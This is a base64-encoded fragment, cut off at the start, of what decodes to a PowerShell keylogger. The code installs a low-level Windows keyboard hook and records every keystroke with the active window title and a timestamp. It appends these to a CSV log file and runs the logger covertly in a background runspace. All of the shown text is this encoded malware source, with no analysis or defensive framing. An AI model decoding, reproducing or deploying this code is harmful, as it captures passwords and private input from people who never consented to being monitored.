CAkS2V5czo6U3BhY2UgICAgICAgeyAkS2V5ID0gJzwgPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6TGVmdCAgICAgICAgeyAkS2V5ID0gJzxMZWZ0PicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6VXAgICAgICAgICAgeyAkS2V5ID0gJzxVcD4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OlJpZ2h0ICAgICAgIHsgJEtleSA9ICc8UmlnaHQ+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpEb3duICAgICAgICB7ICRLZXkgPSAnPERvd24+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpMTWVudSAgICAgICB7ICRLZXkgPSAnPEFsdD4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OlJNZW51ICAgICAgIHsgJEtleSA9ICc8QWx0PicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6TFdpbiAgICAgICAgeyAkS2V5ID0gJzxXaW5kb3dzIEtleT4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OlJXaW4gICAgICAgIHsgJEtleSA9ICc8V2luZG93cyBLZXk+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpMU2hpZnRLZXkgICB7ICRLZXkgPSAnPFNoaWZ0PicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6UlNoaWZ0S2V5ICAgeyAkS2V5ID0gJzxTaGlmdD4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkxDb250cm9sS2V5IHsgJEtleSA9ICc8Q3RybD4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OlJDb250cm9sS2V5IHsgJEtleSA9ICc8Q3RybD4nIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgIyBHZXQgZm9yZWdyb3VuZCB3aW5kb3cncyB0aXRsZQogICAgICAgICAgICAgICAgJFRpdGxlID0gTmV3LU9iamVjdCBUZXh0LlN0cmluZ2J1aWxkZXIgMjU2CiAgICAgICAgICAgICAgICAkR2V0V2luZG93VGV4dC5JbnZva2UoJGhXaW5kb3csICRUaXRsZSwgJFRpdGxlLkNhcGFjaXR5KQoKICAgICAgICAgICAgICAgICMgRGVmaW5lIG9iamVjdCBwcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICAkUHJvcHMgPSBAewogICAgICAgICAgICAgICAgICAgIEtleSA9ICRLZXkKICAgICAgICAgICAgICAgICAgICBUaW1lID0gW0RhdGVUaW1lXTo6Tm93CiAgICAgICAgICAgICAgICAgICAgV2luZG93ID0gJFRpdGxlLlRvU3RyaW5nKCkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAkb2JqID0gTmV3LU9iamVjdCBwc29iamVjdCAtUHJvcGVydHkgJFByb3BzCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgIyBTdHVwaWQgaGFjayBzaW5jZSBFeHBvcnQtQ1NWIGRvZXNuJ3QgaGF2ZSBhbiBhcHBlbmQgc3dpdGNoIGluIFBTdjIKICAgICAgICAgICAgICAgICRDU1ZFbnRyeSA9ICgkb2JqIHwgU2VsZWN0LU9iamVjdCBLZXksV2luZG93LFRpbWUgfCBDb252ZXJ0VG8tQ3N2IC1Ob1R5cGVJbmZvcm1hdGlvbilbMV0KCiAgICAgICAgICAgICAgICAjcmV0dXJuIHJlc3VsdHMKICAgICAgICAgICAgICAgIE91dC1GaWxlIC1GaWxlUGF0aCAkTG9nUGF0aCAtQXBwZW5kIC1JbnB1dE9iamVjdCAkQ1NWRW50cnkgLUVuY29kaW5nIHVuaWNvZGUKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gJENhbGxOZXh0SG9va0V4Lkludm9rZShbSW50UHRyXTo6WmVybywgJENvZGUsICR3UGFyYW0sICRsUGFyYW0pCiAgICAgICAgfQoKICAgICAgICAjIENhc3Qgc2NyaXB0YmxvY2sgYXMgTG93TGV2ZWxLZXlib2FyZFByb2MgY2FsbGJhY2sKICAgICAgICAkRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludDMyXSwgW0ludFB0cl0sIFtJbnRQdHJdKSAoW0ludFB0cl0pCiAgICAgICAgJENhbGxiYWNrID0gJENhbGxiYWNrU2NyaXB0IC1hcyAkRGVsZWdhdGUKICAgIAogICAgICAgICMgR2V0IGhhbmRsZSB0byBQb3dlclNoZWxsIGZvciBob29rCiAgICAgICAgJFBvc2hNb2R1bGUgPSAoR2V0LVByb2Nlc3MgLUlkICRQSUQpLk1haW5Nb2R1bGUuTW9kdWxlTmFtZQogICAgICAgICRNb2R1bGVIYW5kbGUgPSAkR2V0TW9kdWxlSGFuZGxlLkludm9rZSgkUG9zaE1vZHVsZSkKCiAgICAgICAgIyBTZXQgV01fS0VZQk9BUkRfTEwgaG9vawogICAgICAgICRIb29rID0gJFNldFdpbmRvd3NIb29rRXguSW52b2tlKDB4RCwgJENhbGxiYWNrLCAkTW9kdWxlSGFuZGxlLCAwKQogICAgCiAgICAgICAgJFN0b3B3YXRjaCA9IFtEaWFnbm9zdGljcy5TdG9wd2F0Y2hdOjpTdGFydE5ldygpCgogICAgICAgIHdoaWxlICgkdHJ1ZSkgewogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzLlRpbWVvdXQgLWFuZCAoJFN0b3B3YXRjaC5FbGFwc2VkLlRvdGFsTWludXRlcyAtZ3QgJFRpbWVvdXQpKSB7IGJyZWFrIH0KICAgICAgICAgICAgJFBlZWtNZXNzYWdlLkludm9rZShbSW50UHRyXTo6WmVybywgW0ludFB0cl06Olplcm8sIDB4MTAwLCAweDEwOSwgMCkKICAgICAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyAxMAogICAgICAgIH0KCiAgICAgICAgJFN0b3B3YXRjaC5TdG9wKCkKICAgIAogICAgICAgICMgUmVtb3ZlIHRoZSBob29rCiAgICAgICAgJFVuaG9va1dpbmRvd3NIb29rRXguSW52b2tlKCRIb29rKQogICAgfQoKICAgICMgU2V0dXAgS2V5TG9nZ2VyJ3MgcnVuc3BhY2UKICAgICRQb3dlclNoZWxsID0gW1Bvd2VyU2hlbGxdOjpDcmVhdGUoKQogICAgW3ZvaWRdJFBvd2VyU2hlbGwuQWRkU2NyaXB0KCRTY3JpcHQpCiAgICBbdm9pZF0kUG93ZXJTaGVsbC5BZGRBcmd1bWVudCgkTG9nUGF0aCkKICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnMuVGltZW91dCkgeyBbdm9pZF0kUG93ZXJTaGVsbC5BZGRBcmd1bWVudCgkVGltZW91dCkgfQoKICAgICMgU3RhcnQgS2V5TG9nZ2VyCiAgICBbdm9pZF0kUG93ZXJTaGVsbC5CZWdpbkludm9rZSgpCgogICAgaWYgKCRQYXNzVGhydS5Jc1ByZXNlbnQpIHsgcmV0dXJuICRQb3dlclNoZWxsIH0KfQ==
```